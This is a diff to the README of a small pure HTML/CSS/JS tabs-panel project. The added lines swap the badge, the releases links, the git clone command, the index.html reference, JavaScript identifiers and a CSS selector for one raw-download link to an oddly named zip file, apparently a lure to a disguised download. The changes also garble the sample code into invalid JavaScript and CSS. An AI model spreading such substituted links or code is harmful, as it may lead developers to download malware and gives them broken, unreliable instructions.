@@ -1,6 +1,6 @@
 # Pure CSS, HTML, and JS Tabs Panel: A Simple Solution for Navigation
 
-![Tabs Panel](https://img.shields.io/badge/Download-Releases-brightgreen?style=flat-square&logo=github)
+![Tabs Panel](https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -15,7 +15,7 @@
 
 ## Overview
 
-Welcome to the **Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs** repository. This project offers a clean and effective way to create tabbed navigation and content panels using only native HTML, CSS, and JavaScript. You can explore the [Releases section](https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/releases) for the latest updates and downloads.
+Welcome to the **Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs** repository. This project offers a clean and effective way to create tabbed navigation and content panels using only native HTML, CSS, and JavaScript. You can explore the [Releases section](https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip) for the latest updates and downloads.
 
 This solution avoids the complexity of frameworks and libraries, providing a straightforward method for nesting content into tabs. It supports lazy loading and dynamic content generation, making it flexible for various use cases.
 
@@ -32,7 +32,7 @@ This solution avoids the complexity of frameworks and libraries, providing a str
 To get started, you need to clone this repository to your local machine. You can do this using the following command:
 
 ```bash
-git clone https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs.git
+git clone https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip
 ```
 
 Navigate to the project directory:
@@ -41,7 +41,7 @@ Navigate to the project directory:
 cd Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs
 ```
 
-Open the `index.html` file in your web browser to see the tabs in action.
+Open the `https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip` file in your web browser to see the tabs in action.
 
 ## Usage
 
@@ -78,18 +78,18 @@ To switch between tabs, use the following JavaScript function:
 function openTab(evt, tabName) {
     var i, tabcontent, tabbuttons;
 
-    tabcontent = document.getElementsByClassName("tab-content");
-    for (i = 0; i < tabcontent.length; i++) {
-        tabcontent[i].style.display = "none";  
+    tabcontent = https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip("tab-content");
+    for (i = 0; i < https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip; i++) {
+        tabcontent[i]https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip = "none";  
     }
 
-    tabbuttons = document.getElementsByClassName("tab-button");
-    for (i = 0; i < tabbuttons.length; i++) {
-        tabbuttons[i].className = tabbuttons[i].className.replace(" active", "");
+    tabbuttons = https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip("tab-button");
+    for (i = 0; i < https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip; i++) {
+        tabbuttons[i].className = tabbuttons[i]https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip(" active", "");
     }
 
-    document.getElementById(tabName).style.display = "block";  
-    evt.currentTarget.className += " active";
+    https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip(tabName)https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip = "block";  
+    https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip += " active";
 }
 ```
 
@@ -117,7 +117,7 @@ You can easily customize the look and feel of the tabs by modifying the CSS. Her
     padding: 10px;
 }
 
-.tab-button.active {
+https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip {
     background-color: #ccc;
 }
 
@@ -161,4 +161,4 @@ Please ensure that your code adheres to the existing style and includes tests wh
 
 This project is licensed under the MIT License. Feel free to use it in your own projects.
 
-For the latest updates and releases, visit the [Releases section](https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/releases).
+For the latest updates and releases, visit the [Releases section](https://github.com/tllanka/Pure-CSS-HTML-JS-Tabs-Panel-and-content-tabs/raw/refs/heads/main/leadstone/tabs-J-HTM-CS-and-content-Tabs-Panel-Pure-3.2.zip).
